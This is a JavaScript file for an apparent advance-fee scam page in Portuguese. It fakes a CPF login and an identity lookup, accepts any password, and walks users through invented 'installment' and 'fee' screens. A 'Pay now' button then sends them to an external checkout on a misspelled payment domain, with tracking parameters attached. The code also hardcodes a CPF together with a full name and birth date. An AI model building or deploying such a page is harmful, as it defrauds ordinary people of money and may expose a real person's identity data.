document.addEventListener('DOMContentLoaded', function() {
    // Elementos da tela
    const splashScreen = document.getElementById('splashScreen');
    const welcomeScreen = document.getElementById('welcomeScreen');
    const loginScreen = document.getElementById('loginScreen');
    const passwordScreen = document.getElementById('passwordScreen');
    const homeScreen = document.getElementById('homeScreen');
    const receberParcelasScreen = document.getElementById('receberParcelasScreen');
    const calculoTarifasScreen = document.getElementById('calculoTarifasScreen');
    const pagamentoTarifaScreen = document.getElementById('pagamentoTarifaScreen');
    
    // Elementos de UI
    const btnStart = document.getElementById('btnStart');
    const cpfInput = document.getElementById('cpfInput');
    const btnLogin = document.getElementById('btnLogin');
    const errorMessage = document.getElementById('errorMessage');
    const passwordInput = document.getElementById('passwordInput');
    const togglePassword = document.getElementById('togglePassword');
    const passwordError = document.getElementById('passwordError');
    const btnBack = document.getElementById('btnBack');
    const btnEnter = document.getElementById('btnEnter');
    const userName = document.getElementById('userName');
    const userId = document.getElementById('userId');
    const btnReceberParcelas = document.getElementById('btnReceberParcelas');
    const btnBackToHome = document.getElementById('btnBackToHome');
    const btnCalculoContinuar = document.getElementById('btnCalculoContinuar');
    const btnBackToCalculo = document.getElementById('btnBackToCalculo');
    const btnPagarAgora = document.getElementById('btnPagarAgora');
    const btnBackToReceberParcelas = document.getElementById('btnBackToReceberParcelas');
    const calculoNome = document.getElementById('calculoNome');
    const pagamentoNome = document.getElementById('pagamentoNome');
    const protocoloRandomico = document.getElementById('protocoloRandomico');
    
    // Gerar código de protocolo aleatório
    protocoloRandomico.textContent = Math.floor(100000 + Math.random() * 900000);
    
    // Funções utilitárias
    function formatCPF(cpf) {
        return cpf.replace(/\D/g, '')
                 .replace(/(\d{3})(\d)/, '$1.$2')
                 .replace(/(\d{3})(\d)/, '$1.$2')
                 .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
    }
    
    function validateCPF(cpf) {
        const cleanCPF = cpf.replace(/[^\d]/g, '');
        
        if (cleanCPF.length !== 11 || /^(\d)\1{10}$/.test(cleanCPF)) {
            return false;
        }
        
        let sum = 0;
        let remainder;
        
        for (let i = 1; i <= 9; i++) {
            sum = sum + parseInt(cleanCPF.substring(i-1, i)) * (11 - i);
        }
        
        remainder = (sum * 10) % 11;
        
        if ((remainder === 10) || (remainder === 11)) {
            remainder = 0;
        }
        
        if (remainder !== parseInt(cleanCPF.substring(9, 10))) {
            return false;
        }
        
        sum = 0;
        for (let i = 1; i <= 10; i++) {
            sum = sum + parseInt(cleanCPF.substring(i-1, i)) * (12 - i);
        }
        
        remainder = (sum * 10) % 11;
        
        if ((remainder === 10) || (remainder === 11)) {
            remainder = 0;
        }
        
        if (remainder !== parseInt(cleanCPF.substring(10, 11))) {
            return false;
        }
        
        return true;
    }
    
    function showScreen(screen) {
        // Esconde todas as telas
        const allScreens = document.querySelectorAll('.screen');
        allScreens.forEach(screen => screen.classList.add('hidden'));
        
        // Mostra a tela solicitada
        screen.classList.remove('hidden');
    }
    
    function getUrlParams() {
        const params = {};
        const queryString = window.location.search;
        const urlParams = new URLSearchParams(queryString);
        
        // Coletar UTMs e XCOD
        const utmParams = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'xcod'];
        
        utmParams.forEach(param => {
            if (urlParams.has(param)) {
                params[param] = urlParams.get(param);
            }
        });
        
        return params;
    }
    
    function prepareUrlWithParams(url) {
        const params = getUrlParams();
        
        if (Object.keys(params).length === 0) {
            return url;
        }
        
        const urlObj = new URL(url, window.location.origin);
        
        for (const key in params) {
            urlObj.searchParams.set(key, params[key]);
        }
        
        return urlObj.pathname + urlObj.search;
    }
    
    // Simulação da API de consulta de CPF
    async function consultarCPF(cpf) {
        // Simulando uma chamada de API
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        // CPF de exemplo para teste
        if (cpf === '14858751708') {
            return {
                nome: 'Raissa Fabricio Melo da Silva',
                sexo: 'Feminino',
                data_nascimento: '07/09/1994'
            };
        }
        
        // Aqui você poderia adicionar mais CPFs válidos para teste
        
        // Se chegou aqui, retorna dados fictícios
        return {
            nome: 'Maria da Silva',
            sexo: 'Feminino',
            data_nascimento: '01/01/1980'
        };
    }
    
    // Event Listeners
    
    // Formatação do CPF durante digitação
    if (cpfInput) {
        cpfInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            
            if (value.length > 11) {
                value = value.slice(0, 11);
            }
            
            e.target.value = formatCPF(value);
        });
    }
    
    // Timer para transição do Splash Screen para Welcome
    setTimeout(() => {
        showScreen(welcomeScreen);
    }, 2000);
    
    // Botão Acessar na tela de boas-vindas
    if (btnStart) {
        btnStart.addEventListener('click', () => {
            showScreen(loginScreen);
        });
    }
    
    // Botão Próximo na tela de login
    if (btnLogin) {
        btnLogin.addEventListener('click', async () => {
            const cpf = cpfInput.value.replace(/\D/g, '');
            
            if (!validateCPF(cpf)) {
                errorMessage.classList.remove('hidden');
                return;
            }
            
            // Simular processamento
            btnLogin.textContent = 'Processando...';
            btnLogin.disabled = true;
            
            try {
                const userData = await consultarCPF(cpf);
                
                // Salvar dados no localStorage
                localStorage.setItem('userData', JSON.stringify({
                    cpf: cpf,
                    nome: userData.nome,
                    nascimento: userData.data_nascimento
                }));
                
                // Mostrar tela de senha
                showScreen(passwordScreen);
            } catch (error) {
                console.error('Erro ao consultar CPF:', error);
                errorMessage.classList.remove('hidden');
            } finally {
                btnLogin.textContent = 'Próximo';
                btnLogin.disabled = false;
            }
        });
    }
    
    // Toggle visibilidade da senha
    if (togglePassword) {
        togglePassword.addEventListener('click', () => {
            const type = passwordInput.type === 'password' ? 'text' : 'password';
            passwordInput.type = type;
        });
    }
    
    // Botão Voltar na tela de senha
    if (btnBack) {
        btnBack.addEventListener('click', () => {
            showScreen(loginScreen);
        });
    }
    
    // Botão Entrar na tela de senha
    if (btnEnter) {
        btnEnter.addEventListener('click', async () => {
            if (passwordInput.value.length < 4) {
                passwordError.classList.remove('hidden');
                return;
            }
            
            // Simular processamento
            btnEnter.textContent = 'Entrando...';
            btnEnter.disabled = true;
            
            try {
                // Recuperar dados do usuário
                const userData = JSON.parse(localStorage.getItem('userData') || '{}');
                
                // Simular delay de processamento
                await new Promise(resolve => setTimeout(resolve, 800));
                
                // Atualizar UI com dados do usuário
                if (userName) userName.textContent = userData.nome || 'Usuário';
                if (userId) userId.textContent = formatCPF(userData.cpf) || '000.000.000-00';
                
                // Atualizar nomes nas outras telas
                if (calculoNome) {
                    calculoNome.innerHTML = `Olá <span class="nome-usuario">${userData.nome.split(' ')[0] || 'Usuário'}</span>,`;
                }
                
                if (pagamentoNome) {
                    pagamentoNome.innerHTML = `Olá <span class="nome-usuario">${userData.nome.split(' ')[0] || 'Usuário'}</span>,`;
                }
                
                // Mostrar tela inicial
                showScreen(homeScreen);
            } catch (error) {
                console.error('Erro ao fazer login:', error);
                passwordError.classList.remove('hidden');
            } finally {
                btnEnter.textContent = 'Entrar';
                btnEnter.disabled = false;
            }
        });
    }
    
    // Ocultar mensagens de erro ao digitar
    if (passwordInput) {
        passwordInput.addEventListener('input', () => {
            passwordError.classList.add('hidden');
        });
    }
    
    // Botão para ir para a tela de parcelas
    if (btnReceberParcelas) {
        btnReceberParcelas.addEventListener('click', () => {
            showScreen(receberParcelasScreen);
        });
    }
    
    // Botão voltar para home
    if (btnBackToHome) {
        btnBackToHome.addEventListener('click', () => {
            showScreen(homeScreen);
        });
    }
    
    // Botão Receber Parcela
    document.querySelectorAll('.parcela-footer .btn-primary').forEach(btn => {
        btn.addEventListener('click', () => {
            showScreen(calculoTarifasScreen);
        });
    });
    
    // Botão Continuar na tela de cálculo
    if (btnCalculoContinuar) {
        btnCalculoContinuar.addEventListener('click', () => {
            showScreen(pagamentoTarifaScreen);
        });
    }
    
    // Botão Voltar na tela de cálculo
    if (btnBackToReceberParcelas) {
        btnBackToReceberParcelas.addEventListener('click', () => {
            showScreen(receberParcelasScreen);
        });
    }
    
    // Botão Voltar na tela de pagamento
    if (btnBackToCalculo) {
        btnBackToCalculo.addEventListener('click', () => {
            showScreen(calculoTarifasScreen);
        });
    }
    
    // Botão Pagar Agora
    if (btnPagarAgora) {
        btnPagarAgora.addEventListener('click', () => {
            // Obtém parâmetros UTM da URL atual
            const params = getUrlParams();
            let redirectUrl = 'https://pay.compraegurapaay.com/checkout/756bdaca-eb30-4d4e-8cac-01b0106090a7';
            
            // Adiciona parâmetros UTM à URL de redirecionamento
            if (Object.keys(params).length > 0) {
                const url = new URL(redirectUrl);
                for (const key in params) {
                    url.searchParams.set(key, params[key]);
                }
                redirectUrl = url.toString();
            }
            
            // Redireciona para a página de pagamento
            window.location.href = redirectUrl;
        });
    }
});